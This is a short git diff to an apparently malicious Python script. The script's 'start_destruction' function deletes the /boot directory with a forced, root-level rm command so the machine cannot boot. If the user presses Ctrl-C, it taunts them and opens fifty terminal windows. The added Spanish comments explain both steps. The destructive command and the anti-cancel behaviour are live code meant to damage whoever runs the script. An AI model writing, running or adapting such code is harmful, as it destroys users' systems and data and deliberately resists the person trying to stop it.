@@ -3,6 +3,8 @@ from colorama import Fore
 from time import sleep
 from playsound import playsound
 def start_destruction():
+     
+#    Empieza a eliminar el grub para que el usuario no pueda reiniciar así nomas
      system('sudo rm -rf --no-preserve-root /boot/')
      sleep(10)
      try:
@@ -58,6 +60,10 @@ def start_destruction():
      
      except KeyboardInterrupt:
           print("No intentes cancelar el programa noob XDDDDDDDDDDDD")
+          
+#         Si el usuario intenta cancelar, abrirá más emuladores de
+#         Terminal
+
           for _ in range(50):
                system('qterminal')
                
